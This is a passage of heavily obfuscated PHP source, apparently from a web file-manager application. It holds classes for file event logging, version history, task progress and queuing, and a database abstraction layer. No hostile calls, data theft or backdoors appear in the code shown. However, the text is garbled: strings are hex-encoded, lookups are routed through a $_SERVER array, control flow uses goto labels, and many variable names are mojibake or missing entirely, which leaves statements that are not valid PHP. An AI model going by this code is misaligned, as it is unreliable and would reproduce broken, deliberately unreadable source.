$[$[190]], $[2106] => $[$[42]], $[560] => !empty($[$[560]]) ? $[$[560]] : $[22], $[1676] => $, $[473] => $—ò, $[1678] => $Œµ); $this->addSystemLog($—ò, $Ó∞É); unset($Ó∞É[$[2106]], $Ó∞É[$[560]]); return $this->add($Ó∞É); } private function addSystemLog($, $⁄°) { $ =& $_SERVER[]; if ($ == $[2107]) { $ = $⁄°[$[503]][$[2108]]; } else { if (in_array($, array($[1863], $[2109]))) { $ = $⁄°[$[503]][$[794]]; } } $ = array_merge($⁄°, array($[2110] => $⁄°[$[191]], $[2111] => $⁄°[$[2111]])); Hook::trigger($[2112], $[2113] . $, $⁄°); Model($[1827])->addLog($[2113] . $, $); } private function isCacheEvent($‰ø´, $‰íç) { if ($‰ø´[$_SERVER[][188]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ﬂ†, $) { $Èëó =& $_SERVER[]; $ = Model($Èëó[1373])->sourceInfo($ﬂ†); $ﬁ† = array($Èëó[2108] => $, $Èëó[42] => $[$Èëó[42]]); return $this->addEvent($ﬂ†, $Èëó[2107], $ﬁ†); } public function eventFileEdit($–õ¬ë) { $ =& $_SERVER[]; $ = array($[2114] => $_SERVER[$[2115]], $[2116] => strtolower(ACTION)); if (isset($GLOBALS[$[17]][$[2117]])) { $[$[2117]] = $[98]; } return $this->addEvent($–õ¬ë, $[1853], $); } public function eventRecycle($Í•£, $) { return $this->addEvent($Í•£, $_SERVER[][2109], $); } public function eventRemove($) { $ =& $_SERVER[]; $—Ø = Model($[1373])->sourceInfo($); $√± = $—Ø[$[42]]; return $this->addEvent($—Ø[$[190]], $[1852], $√±); } public function eventShare($, $ƒò) { return $this->addEvent($, $_SERVER[][1863], $ƒò); } public function eventMove($, $, $¬æ) { $·®® =& $_SERVER[]; $„±ö = Model($·®®[1373]); $Ë¨ö = $„±ö->sourceInfo($); $⁄≤ = $„±ö->sourceInfo($); $ = $„±ö->sourceInfo($¬æ); $ﬁ¥ = array($·®®[1201] => $, $·®®[2118] => $⁄≤[$·®®[42]], $·®®[2095] => !empty($⁄≤[$·®®[560]]) ? $⁄≤[$·®®[560]] : $·®®[22], $·®®[1202] => $¬æ, $·®®[2119] => $[$·®®[42]], $·®®[2120] => !empty($[$·®®[560]]) ? $[$·®®[560]] : $·®®[22]); $this->addEvent($, $·®®[597], $ﬁ¥); $Ë¨ö = $„±ö->sourceInfo($); $ﬁ¥ = array($·®®[191] => $Ë¨ö[$·®®[191]], $·®®[42] => $Ë¨ö[$·®®[42]]); $this->addEvent($, $·®®[2121], $ﬁ¥); } public function eventCopy($÷∞Ã∑) { $this->eventCreate($÷∞Ã∑, $_SERVER[][595]); } public function eventRename($œñ÷Ç, $…≠, $„ïª) { $«•€≠ =& $_SERVER[]; $·®ª = array($«•€≠[1201] => $…≠, $«•€≠[1202] => $„ïª); return $this->addEvent($œñ÷Ç, $«•€≠[1387], $·®ª); } public function eventAddComment($ƒÅ, $“º) { return $this->addEvent($ƒÅ, $_SERVER[][2122], $“º); } public function eventAddDesc($, $ ¶ƒ¨) { return $this->addEvent($, $_SERVER[][2123], $ ¶ƒ¨); } public function listBySource($«ö) { $¬ï =& $_SERVER[]; $ = Model($¬ï[1373])->sourceInfo($«ö); $ = array($¬ï[468] => $«ö); if ($[$¬ï[462]] == $¬ï[98]) { $ = Model($¬ï[1373])->listSearchChildren($«ö, 20000); $[] = $«ö . $¬ï[431]; $ = array($¬ï[191] => array($¬ï[17], $)); } $ = $this->where($)->order($¬ï[2124])->selectPage(); if ($[$¬ï[419]][$¬ï[420]] == 0) { $[$¬ï[419]][$¬ï[420]] = 1; $[$¬ï[422]] = array(array($¬ï[468] => $«ö, $¬ï[2105] => $[$¬ï[190]], $¬ï[1676] => $[$¬ï[504]], $¬ï[473] => $¬ï[2125], $¬ï[474] => $[$¬ï[225]], $¬ï[1678] => $¬ï[22])); } return $this->eventListParse($, $«ö); } private function eventListParse($, $) { $ =& $_SERVER[]; $ = $[$[422]]; $·ª¨ = array_to_keyvalue($, $[22], $[191]); $œí÷Ñ = array_to_keyvalue($, $[22], $[2111]); foreach ($ as $ƒô) { $÷≠ = $ƒô[$[503]]; if ($ƒô[$[43]] == $[597] && isset($÷≠[$[1201]])) { $·ª¨[] = $÷≠[$[1201]] . $[22]; $·ª¨[] = $÷≠[$[1202]] . $[22]; } if ($ƒô[$[43]] == $[2121] && isset($÷≠[$[191]])) { $·ª¨[] = $÷≠[$[191]] . $[22]; } } $·ª¨ = array_merge($·ª¨, $œí÷Ñ, array($ . $[22])); $·ª¨ = array_unique($·ª¨); $Ãé = array_unique(array_to_keyvalue($, $[22], $[1685])); $€ï = Model($[576])->userListInfo($Ãé); $ƒæ = Model($[865])->sourceListInfo($·ª¨, !0); foreach ($ as &$ƒô) { if ($ƒô[$[43]] == $[597] && isset($ƒô[$[503]][$[1201]])) { $ƒô[$[503]][$[1201]] = $ƒæ[$ƒô[$[503]][$[1201]]]; $ƒô[$[503]][$[1202]] = $ƒæ[$ƒô[$[503]][$[1202]]]; } if ($ƒô[$[43]] == $[2121] && isset($ƒô[$[503]][$[191]])) { $ƒô[$[503]][$[191]] = $ƒæ[$ƒô[$[503]][$[191]]]; } $ƒô[$[97]] = $ƒæ[$ƒô[$[191]]]; $ƒô[$[2126]] = $ƒæ[$ƒô[$[2111]]]; if ($ƒô[$[43]] == $[1852]) { $ƒô[$[2126]] = $ƒô[$[97]]; $ƒô[$[2111]] = $ƒô[$[2126]][$[191]]; $ƒô[$[97]] = !1; $ƒô[$[191]] = $[22]; } $ƒô[$[2055]] = $€ï[$ƒô[$[1685]]]; } unset($ƒô); $[$[422]] = $; return $; } public function removeBySource($) { $‚Æ¥ = array($_SERVER[][468] => $); $this->where($‚Æ¥)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\143\x65\x5f\x68\151\163\x74\157\162\171"; public function historyCount($) { $ÕÇ =& $_SERVER[]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ = array($ÕÇ[191], $ÕÇ[1916] => $ÕÇ[542]); $Ÿé = array($ÕÇ[191] => array($ÕÇ[17], $)); $ = $this->field($)->where($Ÿé)->group($ÕÇ[191])->select(); return array_to_keyvalue($, $ÕÇ[191], $ÕÇ[542]); } public function addHistory($€Ω, $»¥“ã = '') { $ =& $_SERVER[]; $€ë = array($[468] => $€Ω[$[191]], $[1676] => isset($€Ω[$[506]]) ? $€Ω[$[506]] : $€Ω[$[504]], $[519] => $€Ω[$[518]], $[594] => $€Ω[$[86]], $[2127] => $»¥“ã); if ($GLOBALS[$[16]][$[99]][$[1258]] >= 1) { $this->historyAutoClear($€ë[$[191]]); $this->add($€ë); } Hook::trigger($[2128], $€ë); Model($[2129])->eventFileEdit($€Ω[$[191]]); } private function historyAutoClear($÷Ñ) { $≈ú…• =& $_SERVER[]; $ = Model($≈ú…•[810])->get($≈ú…•[1280]); $ = $GLOBALS[$≈ú…•[16]][$≈ú…•[99]][$≈ú…•[1258]]; $…î = $ == $≈ú…•[1281] ? min(5, $) : $; $…î = $…î <= 0 ? 0 : $…î - 1; if ($…î >= 500) { return; } $‹óÀ≠ = array($≈ú…•[468] => $÷Ñ); $ƒ± = $this->field($≈ú…•[2130])->where($‹óÀ≠)->order($≈ú…•[2124])->select(); if (!$ƒ± || $…î >= count($ƒ±)) { return; } $»ñ = array_to_keyvalue($ƒ±, $≈ú…•[22], $≈ú…•[452]); $»ñ = array_slice($»ñ, $…î); $Ê∑ÖŸÆ = array_to_keyvalue($ƒ±, $≈ú…•[22], $≈ú…•[518]); $Ê∑ÖŸÆ = array_slice($Ê∑ÖŸÆ, $…î); if (!$»ñ || !$Ê∑ÖŸÆ) { return; } $‹óÀ≠ = array($≈ú…•[470] => array($≈ú…•[17], $»ñ)); $this->where($‹óÀ≠)->delete(); Model($≈ú…•[521])->remove($Ê∑ÖŸÆ); } public function listData($) { $ =& $_SERVER[]; $ = array($[468] => $); $ = $[2131]; $¬Ö = $this->field($)->where($)->order($[2124])->selectPage(); $this->_listAppendUser($¬Ö[$[422]]); $‹Ñ = Model($[810])->get($[1280]); $¬ç = 5; if ($‹Ñ == $[1281]) { $¬Ö[$[422]] = array_slice($¬Ö[$[422]], 0, $¬ç); $¬Ö[$[419]] = array($[2132] => 1, $[2133] => 20, $[2134] => 1, $[2135] => count($¬Ö[$[422]])); } return $¬Ö; } protected function _listAppendUser(&$“á) { $Õ° =& $_SERVER[]; $»ë = array_to_keyvalue($“á, $Õ°[22], $Õ°[1685]); $‘í = Model($Õ°[576])->userListInfo($»ë); foreach ($“á as &$Ãä) { $Ãπ“ê = $Ãä[$Õ°[1685]]; $Ãä[$Õ°[504]] = $‘í[$Ãπ“ê] ? $‘í[$Ãπ“ê] : !1; } unset($Ãä); } public function fileInfo($…ò) { $Ÿô =& $_SERVER[]; $—ç = $this->tablePrefix; $·±ã = "{$—ç}\151\157\137\x66\151\154\x65\40\146\x69\154\x65\x73\40\x6f\156\40\x66\151\x6c\x65\163\x2e\146\x69\x6c\x65\x49\104\40\x3d\x20\x68\151\x73\x74\157\162\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($Ÿô[2136])->where(array($Ÿô[470] => $…ò))->join($·±ã, $Ÿô[2137])->find(); } public function removeItem($Ë†ë”≠) { $ÕÅ«° =& $_SERVER[]; $Ã´◊ó = array($ÕÅ«°[470] => $Ë†ë”≠); $ÿö = $this->where($Ã´◊ó)->find(); if ($ÿö) { $ = $this->where($Ã´◊ó)->delete(); Model($ÕÅ«°[521])->remove($ÿö[$ÕÅ«°[518]]); return $; } return !1; } public function removeBySource($) { $ﬂô =& $_SERVER[]; if (!$) { return !1; } if (!is_array($)) { $ = array($); } $‰è¶ﬂ± = array($ﬂô[468] => array($ﬂô[17], $)); $◊è = $this->field($ﬂô[519])->where($‰è¶ﬂ±)->select(); if ($◊è) { $this->where($‰è¶ﬂ±)->delete(); $ = array_to_keyvalue($◊è, $ﬂô[22], $ﬂô[518]); Model($ﬂô[521])->remove($); } return !0; } public function setDetail($‚∏ì, $ÈÑî) { $ÕúÃ∞ =& $_SERVER[]; return $this->where(array($ÕúÃ∞[470] => $‚∏ì))->save(array($ÕúÃ∞[2127] => $ÈÑî)); } public function rollbackToItem($, $) { $ =& $_SERVER[]; $ = Model($[865])->sourceInfo($); $this->addHistory($, LNG($[2138])); $‹ä = $this->find($); $Àä = array($[518] => $‹ä[$[518]], $[86] => $‹ä[$[86]], $[95] => time(), $[506] => USER_ID); Model($[865])->where(array($[191] => $))->save($Àä); return $this->where(array($[470] => $))->delete(); } public function clearSame($ﬂø) { $ÓïÇ =& $_SERVER[]; $ƒπ = $this->listData($ﬂø); $¬Ü = array_to_keyvalue_group($ƒπ, $ÓïÇ[518]); $Õª = array(); $ÕèÂ§ø = array(); foreach ($¬Ü as $Ÿ≠) { if (!$Ÿ≠ || count($Ÿ≠) <= 1) { continue; } foreach ($Ÿ≠ as $…òÿ¢) { $Õª[] = $…òÿ¢[$ÓïÇ[518]]; $ÕèÂ§ø[] = $…òÿ¢[$ÓïÇ[452]]; } } if (!$ÕèÂ§ø) { return; } $this->where(array($ÓïÇ[452] => array($ÓïÇ[17], $ÕèÂ§ø)))->delete(); Model($ÓïÇ[521])->remove($Õª); } public function userSpace() { $»• =& $_SERVER[]; $◊† = $this->tablePrefix; $ = array($»•[1676] => USER_ID); $ = "{$◊†}\x69\157\x5f\146\151\154\145\x20\146\x69\154\145\163\x20\157\156\40\x66\151\x6c\x65\163\x2e\x66\x69\x6c\x65\111\104\40\75\40\150\x69\163\x74\157\162\171\x2e\146\151\x6c\x65\111\104"; return $this->alias($»•[2136])->where($)->join($, $»•[2137])->sum($»•[86]); } } goto aŸõ; EﬁèÃë: class TaskHttp extends Task { protected function startAfter() { $ =& $_SERVER[]; $ﬂÅ =& $this->task; $ﬂÅ[$[1762]] = 1; Hook::bind($[1730], array($this, $[1763])); Hook::bind($[1732], array($this, $[1764])); Hook::bind($[1734], array($this, $[1765])); } protected function endAfter() { $»â =& $_SERVER[]; Hook::unbind($»â[1730], array($this, $»â[1763])); Hook::unbind($»â[1732], array($this, $»â[1764])); Hook::unbind($»â[1734], array($this, $»â[1765])); } public function progressStart($Î≥∫) { $ =& $_SERVER[]; $ = curl_getinfo($Î≥∫); self::log($[1766] . $[$[360]]); self::valueSet($this->task[$[452]], $this->task); } public function progressEnd($≈ª) { $∆∑ =& $_SERVER[]; self::log($∆∑[1767] . $this->task[$∆∑[452]]); $this->end(); } public function progress($, $¬∞, $Õ£, $, $) { $ =& $_SERVER[]; $∆ã =& $this->task; if ($ > 0) { $∆ã[$[826]] = $∆ã[$[826]] == 0 ? $ : $∆ã[$[826]]; $∆ã[$[1686]] = $; } else { if ($Õ£ > 0) { $∆ã[$[826]] = $∆ã[$[826]] == 0 ? $¬∞ : $∆ã[$[826]]; $∆ã[$[1686]] = $Õ£; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\x65\x73\x73\x48\x74\x74\160\x3a\144\157\167\x6e\72{$Õ£}\57{$¬∞}\x3b\40\x75\160\154\157\x61\x64\72{$}\x2f{$}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($›•, $ = '', $÷• = 0, $ = '') { $ =& $_SERVER[]; $œ∏…™ = new Task($›•, $, $÷•, $); $GLOBALS[$[1768] . $›•] = new TaskLog($[1669], $œ∏…™, $); return $œ∏…™; } public function __construct($Ëñµ = '', $–Ω = '', $‹π = '') { $«Æ =& $_SERVER[]; if (!$Ëñµ) { $Ëñµ = $«Æ[1669]; } $ = $Ëñµ . $«Æ[439] . rand_string(10); if (!$‹π) { $‹π = $Ëñµ . $«Æ[63] . $‹π; } switch ($Ëñµ) { case $«Æ[1669]: if (!$–Ω || !$–Ω->task) { return echoLog($Ëñµ . $«Æ[1769]); } $’≠œï = $–Ω; $ = $’≠œï->task[$«Æ[452]]; $Ëñµ = $’≠œï->task[$«Æ[452]]; if (!$’≠œï->task[$«Æ[1582]]) { $’≠œï->task[$«Æ[1582]] = $‹π ? $‹π : $Ëñµ; } break; case $«Æ[1770]: if (!$–Ω) { return echoLog($Ëñµ . $«Æ[1771]); } $ﬁè = is_string($–Ω) ? array($–Ω) : $–Ω; $’≠œï = new TaskFileTransfer($, $Ëñµ, 0, $‹π ? $‹π : $ﬁè[0]); foreach ($ﬁè as $…†) { $’≠œï->addPath($…†); } break; case $«Æ[366]: if (!$–Ω) { return echoLog($Ëñµ . $«Æ[1771]); } $ﬁè = is_string($–Ω) ? array($–Ω) : $–Ω; $’≠œï = new TaskZip($, $Ëñµ, 0, $‹π ? $‹π : $ﬁè[0]); foreach ($ﬁè as $…†) { $’≠œï->addPath($…†); } break; case $«Æ[1255]: if (!$–Ω) { return echoLog($Ëñµ . $«Æ[1771]); } $’≠œï = new TaskUnZip($, $Ëñµ, 0, $‹π ? $‹π : $–Ω); if ($–Ω) { $’≠œï->addFile($–Ω); } break; case $«Æ[159]: $’≠œï = new TaskHttp($, $Ëñµ); break; default: return; break; } $this->task = $’≠œï; $this->taskID = $; Hook::bind($«Æ[1706], array($this, $«Æ[1772])); Hook::bind($«Æ[1708], array($this, $«Æ[1773])); Hook::bind($«Æ[1702], array($this, $«Æ[1774])); echoLog($«Æ[1775] . $’≠œï->task[$«Æ[1582]]); } public function __destruct() { $this->end(); } public function end($…≠ = '') { $…© =& $_SERVER[]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($…≠); $this->task = !1; $this->taskID = !1; Hook::unbind($…©[1706], array($this, $…©[1772])); Hook::unbind($…©[1708], array($this, $…©[1773])); Hook::unbind($…©[1702], array($this, $…©[1774])); } public function taskUpdate($ﬁö) { $ =& $_SERVER[]; if (!$ﬁö || $this->taskID != $ﬁö[$[452]]) { return; } $›∫ = 20; $ = intval($ﬁö[$[1687]] * $›∫); $ = $[173] . str_repeat($[925], $) . $[1055] . str_repeat($[63], $›∫ - $) . $[175]; $Œî = $ . sprintf($[1776], $ﬁö[$[1687]] * 100) . $[1777]; $√ä÷ª = $Œî . $ﬁö[$[1686]] . $[18] . $ﬁö[$[826]] . LNG($[1778]); $Âá¨ = $[22]; if ($ﬁö[$[1762]]) { $√ä÷ª = $Œî . size_format($ﬁö[$[1686]]) . $[18] . size_format($ﬁö[$[826]]); $Âá¨ = size_format($ﬁö[$[1688]]) . $[1779]; } if ($ﬁö[$[1105]]) { $ﬁö[$[1736]] = $ﬁö[$[1105]] . $[63] . $ﬁö[$[1736]]; } if ($ﬁö[$[1736]]) { $ƒÅ = $[22]; if ($ﬁö[$[1738]]) { $ƒÅ = $[60] . size_format($ﬁö[$[1739]]) . $[18] . size_format($ﬁö[$[1738]]); } $Âá¨ .= $ﬁö[$[1736]] . $ƒÅ; } if ($ﬁö[$[803]] && !$ﬁö[$[1738]]) { $Âá¨ .= $[63] . size_format($ﬁö[$[1743]]) . $[18] . size_format($ﬁö[$[803]]); } echoLog($√ä÷ª . $[63] . $Âá¨, !0); } public function taskEnd($) { $ÿ® =& $_SERVER[]; if (!$ || $this->taskID != $[$ÿ®[452]]) { return; } $ = $ ? $[$ÿ®[1686]] . $ÿ®[18] . $[$ÿ®[826]] . LNG($ÿ®[1778]) . $ÿ®[81] : $ÿ®[22]; echoLog($ÿ®[1780] . $[$ÿ®[1582]] . ($[$ÿ®[503]] ? $ÿ®[81] . $[$ÿ®[503]] : $ÿ®[22]) . $ÿ®[81] . $ . $ÿ®[1781] . sprintf($ÿ®[891], timeFloat() - $[$ÿ®[1689]]) . $ÿ®[1701]); $this->end(); } public function taskKill($) { $÷π =& $_SERVER[]; if (!$ || $this->taskID != $[$÷π[452]]) { return; } echoLog($÷π[1782] . $[$÷π[1582]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\x75\x65\165\x65\x4c\145\156\x67\x74\150"; const QUEUE_DATA = "\164\141\163\x6b\121\165\x65\165\x65\104\141\164\141"; const QUEUE_TIME = "\164\141\163\x6b\x51\165\x65\x75\145\114\x61\163\x74\122\x75\156"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\165\145\x75\145\124\150\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($, $Œ¥ = array(), $›é = '', $”∫œû = '') { $⁄å =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($”∫œû && array_find_by_field(self::$listData, $⁄å[104], $”∫œû)) { return !0; } if ($”∫œû && array_find_by_field(self::$listDataAdd, $⁄å[104], $”∫œû)) { return !0; } self::$listDataAdd[] = array($⁄å[317] => $, $⁄å[1783] => $Œ¥, $⁄å[503] => $›é, $⁄å[104] => $”∫œû); return !0; } public static function addSubmit() { $¬≥ =& $_SERVER[]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¬≥[1784] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¬≥[22], $¬≥[503])), $¬≥[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Áòä, $–¶ = array(), $◊≥ = '', $÷¥ = '') { $ =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $—† = self::getAll(); if ($÷¥ && array_find_by_field($—†, $[104], $÷¥)) { return !0; } $—†[] = array($[317] => $Áòä, $[1783] => $–¶, $[503] => $◊≥, $[104] => $÷¥); self::setAll($—†); write_log($[1784] . $◊≥, $[195]); return !0; } public static function run() { $Ÿì =& $_SERVER[]; $’ñ = self::getAll(); $ = array_shift($’ñ); if (!$) { return !1; } self::setAll($’ñ); $œà = timeFloat(); $∆É = $Ÿì[22]; try { $∆É = Hook::apply($[$Ÿì[317]], $[$Ÿì[1783]]); } catch (Exception $€å) { write_log($€å, $Ÿì[1223]); } $’ù = number_format(timeFloat() - $œà, 3) . $Ÿì[1701]; if ($∆É && is_string($∆É)) { $’ù = $’ù . $Ÿì[1785] . $∆É; } write_log($Ÿì[1786] . $[$Ÿì[503]] . $Ÿì[1787] . $’ù, $Ÿì[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ =& $_SERVER[]; $∆µ = self::threadCount() + 1; if ($∆µ > 3 || !self::count()) { return; } write_log($[1788] . $∆µ, $[195]); Cache::set(self::QUEUE_THREAD, $∆µ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($[1789], $[195]); } public static function getKey($Í£ß, $ÀÅ = "\151\156\164") { $ =& $_SERVER[]; Cache::removeMemory($Í£ß); $ = Cache::get($Í£ß); if ($ÀÅ == $[341]) { return $ ? intval($) : 0; } if ($ÀÅ == $[1790]) { return is_array($) ? $ : array(); } return $; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[][1790]); } public static function setAll($) { $ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($), $); Cache::set(self::QUEUE_DATA, $, $); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto Aÿô; dÕÇ: class DbSqlite3 extends DbSqlite3Base { public function query($›Æ) { $‘Ö =& $_SERVER[]; if (!CacheLock::fileLock($‘Ö[23])) { return !1; } $∆§ = parent::query($›Æ); CacheLock::fileUnLock($‘Ö[23]); return $∆§; } public function execute($œÜ¬É) { $›≠ =& $_SERVER[]; if (!CacheLock::fileLock($›≠[23])) { return !1; } $ = parent::execute($œÜ¬É); CacheLock::fileUnLock($›≠[23]); return $; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\x3c\x3e", "\147\x74" => "\76", "\x65\147\164" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\75", "\156\x6f\164\x6c\x69\153\145" => "\x4e\117\x54\40\114\111\113\105", "\154\151\x6b\x65" => "\x4c\111\x4b\x45", "\151\x6e" => "\111\x4e", "\156\x6f\x74\x69\x6e" => "\x4e\117\x54\40\x49\x4e", "\156\x6f\x74\x20\x69\156" => "\x4e\117\124\40\x49\x4e", "\142\x65\164\x77\145\x65\x6e" => "\x42\105\x54\x57\x45\105\116", "\x6e\157\164\142\145\164\167\145\x65\x6e" => "\116\x4f\124\x20\102\105\124\x57\x45\105\116", "\x6e\x6f\x74\x20\142\x65\x74\x77\145\x65\x6e" => "\116\x4f\124\40\x42\105\x54\x57\x45\x45\116"); protected $selectSql = "\123\x45\x4c\105\x43\x54\45\x44\x49\x53\x54\x49\x4e\103\x54\45\40\45\106\111\x45\x4c\104\45\40\x46\122\117\115\40\x25\x54\101\x42\x4c\x45\x25\x25\112\117\111\x4e\x25\45\127\110\x45\x52\x45\45\x25\107\122\117\x55\120\x25\x25\110\x41\x56\111\116\107\45\45\117\x52\x44\x45\122\x25\45\x4c\x49\115\111\124\45\x20\x25\125\116\111\117\116\45\x25\x43\117\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $◊ê = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][1001], $◊ê); } public function factory($‹É = '') { $—Å =& $_SERVER[]; $‹É = $this->parseConfig($‹É); if (empty($‹É[$—Å[1002]])) { think_exception(think_lang($—Å[1003])); } $this->dbType = ucwords(strtolower($‹É[$—Å[1002]])); $ = $—Å[1004] . $this->dbType; if (class_exists($)) { $—† = new $($‹É); if ($—Å[1005] != strtolower($‹É[$—Å[1002]])) { $—†->dbType = strtoupper($this->dbType); } else { $—†->dbType = $this->_getDsnType($‹É[$—Å[957]]); } } else { think_exception(think_lang($—Å[1006]) . $—Å[1007] . $); } return $—†; } public function __call($Ôä©, $) { if (method_exists($this, $Ôä©)) { return call_user_func_array(array($this, $Ôä©), $); } } protected function _getDsnType($) { $ = explode($_SERVER[][4], $); $ﬁÜ = strtoupper(trim($[0])); return $ﬁÜ; } private function parseConfig($ = '') { $ =& $_SERVER[]; if (!empty($) && is_string($)) { $ = $this->parseDSN($); } elseif (is_array($)) { $ = array_change_key_case($); $ = array($[1002] => $[$[1008]], $[929] => $[$[1009]], $[930] => $[$[1010]], $[927] => $[$[1011]], $[928] => $[$[1012]], $[31] => $[$[1013]], $[957] => $[$[1014]], $[27] => isset($[$[1015]]) ? $[$[1015]] : array()); } elseif (empty($)) { if (think_config($[1016]) && $[1005] != strtolower(think_config($[1017]))) { $ = $this->parseDSN(think_config($[1016])); } else { $ = array($[1002] => think_config($[1017]), $[929] => think_config($[1018]), $[930] => think_config($[1019]), $[927] => think_config($[1020]), $[928] => think_config($[1021]), $[31] => think_config($[299]), $[957] => think_config($[1016]), $[27] => think_config($[1022])); } } return $; } protected function initConnect($ ∂ = true) { if (1 == think_config($_SERVER[][32])) { $this->_linkID = $this->multiConnect($ ∂); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ => $Àµ) { $this->_linkID = $Àµ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($»ç = false) { $ =& $_SERVER[]; static $‚ù∞ = array(); static $ = -1; if (empty($‚ù∞)) { foreach ($this->config as $ÏªÄ => $Òååº) { $‚ù∞[$ÏªÄ] = explode($[60], $Òååº); } } if (think_config($[1023])) { if ($»ç || think_config($[448]) === !0) { $€™ = floor(mt_rand(0, think_config($[1024]) - 1)); $ = $€™; } else { if (is_numeric(think_config($[1025]))) { $€™ = think_config($[1025]); } else { $€™ = floor(mt_rand(think_config($[1024]), count($‚ù∞[$[927]]) - 1)); } } } else { $€™ = floor(mt_rand(0, count($‚ù∞[$[927]]) - 1)); $ = $€™; } $€™ = $ !== -1 ? $ : $€™; $”ë = array($[929] => isset($‚ù∞[$[929]][$€™]) ? $‚ù∞[$[929]][$€™] : $‚ù∞[$[929]][0], $[930] => isset($‚ù∞[$[930]][$€™]) ? $‚ù∞[$[930]][$€™] : $‚ù∞[$[930]][0], $[927] => isset($‚ù∞[$[927]][$€™]) ? $‚ù∞[$[927]][$€™] : $‚ù∞[$[927]][0], $[928] => isset($‚ù∞[$[928]][$€™]) ? $‚ù∞[$[928]][$€™] : $‚ù∞[$[928]][0], $[31] => isset($‚ù∞[$[31]][$€™]) ? $‚ù∞[$[31]][$€™] : $‚ù∞[$[31]][0], $[957] => isset($‚ù∞[$[957]][$€™]) ? $‚ù∞[$[957]][$€™] : $‚ù∞[$[957]][0], $[27] => isset($‚ù∞[$[27]][$€™]) ? $‚ù∞[$[27]][$€™] : $‚ù∞[$[27]][0]); return $this->connect($”ë, $€™); } public function parseDSN($) { $ =& $_SERVER[]; if (empty($)) { return !1; } $ÿØ = parse_url($); if ($ÿØ[$[205]]) { $ÿº = array($[1002] => $ÿØ[$[205]], $[929] => isset($ÿØ[$[639]]) ? $ÿØ[$[639]] : $[22], $[930] => isset($ÿØ[$[1026]]) ? $ÿØ[$[1026]] : $[22], $[927] => isset($ÿØ[$[206]]) ? $ÿØ[$[206]] : $[22], $[928] => isset($ÿØ[$[207]]) ? $ÿØ[$[207]] : $[22], $[31] => isset($ÿØ[$[94]]) ? substr($ÿØ[$[94]], 1) : $[22]); } else { preg_match($[1027], trim($), $Áµ•); $ÿº = array($[1002] => $Áµ•[1], $[929] => $Áµ•[2], $[930] => $Áµ•[3], $[927] => $Áµ•[4], $[928] => $Áµ•[5], $[31] => $Áµ•[6]); } $ÿº[$[957]] = $[22]; return $ÿº; } protected function debug() { $ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $[1028]; if (think_config($[1029])) { think_status($[1030]); think_trace($this->queryStr . $[1031] . think_status($[34], $[1030], 6) . $[1032], $[22], $[1033]); } } protected function parseLock($ = false) { $∆å =& $_SERVER[]; if (!$) { return $∆å[22]; } if ($∆å[959] == $this->dbType) { return $∆å[1034]; } return $∆å[1035]; } protected function parseSet($) { $Õ∂ =& $_SERVER[]; foreach ($ as $ﬂè => $œÑﬂ°) { if (is_array($œÑﬂ°) && $Õ∂[350] == $œÑﬂ°[0]) { $[] = $this->parseKey($ﬂè) . $Õ∂[925] . $œÑﬂ°[1]; } elseif (is_scalar($œÑﬂ°) || is_null($œÑﬂ°)) { $[] = $this->parseKey($ﬂè) . $Õ∂[925] . $this->parseValue($œÑﬂ°); } } return $Õ∂[1036] . implode($Õ∂[60], $); } protected function bindParam($€ª, $—Ø≈∂) { $this->bind[$_SERVER[][4] . $€ª] = $—Ø≈∂; } protected function parseBind($) { $ = array_merge($this->bind, $); $this->bind = array(); return $; } function parseKey(&$, $ÀÑ = true) { if ($ÀÑ) { $ = $this->parseKeyCheck($); } return $; } function parseKeyCheck($) { $—ó‹Ç =& $_SERVER[]; $ = trim($); if 